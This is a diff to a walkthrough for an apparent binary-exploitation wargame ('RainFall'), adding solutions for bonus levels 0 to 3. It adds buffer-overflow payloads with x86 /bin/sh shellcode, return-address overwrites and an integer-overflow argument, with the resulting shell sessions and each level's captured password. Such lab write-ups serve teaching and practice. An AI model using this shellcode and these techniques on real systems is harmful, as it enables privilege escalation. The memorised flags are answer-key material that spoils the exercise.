@@ -248,7 +248,7 @@ $ ls -a
 $ cat .pass
 c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
 ```
-## level09
+## level 09
 ```bash
 
 level9@RainFall:~$ env -i payload=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') ./level9 $(python -c 'print "\x63\xfc\xff\xbf"+"B"*104+"\x0c\xa0\x04\x08"')
@@ -259,4 +259,73 @@ bonus0
 $ cd ../bonus0  
 $ cat .pass
 f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+```
+
+## bonus 00
+```bash
+export SHELLCODE=`python -c "print '\x25\xf7\xff\xbf' + '\x90' * 500 + '\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80'"`
+
+bonus0@RainFall:~$ python -c "print 'A' * 4095 + '\n' + 'A' * 9 + '\x0e\xf7\xff\xbf' + 'A' * 30" > /tmp/file
+bonus0@RainFall:~$ cat /tmp/file - | ./bonus0
+ - 
+ - 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAA��� AAAAAAAAA���AAAAAAA���
+whoami
+bonus1
+cat .pass
+cat: .pass: Permission denied
+cd ../bonus1
+cat .pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+```
+## bonus 01
+```bash
+bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "\x46\x4c\x4f\x57" * 30')
+$ 
+$ whoami
+bonus2
+$ cd ../bonus2/.
+$ cat .pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+$ 
+```
+## bonus 02
+```bash
+export 
+LANG=fi
+bonus2@RainFall:~$ ./bonus2 `python -c "print '\x44\xf6\xff\xbf' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * 15 + ' ' + 'A' * 18 + '\x40\xf6\xff\xbf'"`
+Hyvää päivää D���1���Qh//shh/bin��
+                                  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@���
+Segmentation fault (core dumped)
+bonus2@RainFall:~$ unset SHELLCODE
+bonus2@RainFall:~$ ./bonus2 `python -c "print '\x44\xf6\xff\xbf' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * 15 + ' ' + 'A' * 18 + '\x40\xf6\xff\xbf'"`
+Hyvää päivää D���1���Qh//shh/bin��
+                                  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@���
+$ id
+uid=2012(bonus2) gid=2012(bonus2) euid=2013(bonus3) egid=100(users) groups=2013(bonus3),100(users),2012(bonus2)
+$ whoami
+bonus3
+$ cd ../bonus3    
+$ cat .pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+$ 
+```
+
+## bonus 03
+```bash
+bonus3@RainFall:~$ ./bonus3 ""
+$ id
+uid=2013(bonus3) gid=2013(bonus3) euid=2014(end) egid=100(users) groups=2014(end),100(users),2013(bonus3)
+$ whoami
+end
+$ cd ../end
+$ ls
+end
+$ cat .pqss
+cat: .pqss: No such file or directory
+$ cat .pass
+3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
+$ cat end    
+Congratulations graduate!
+$ 
 ```
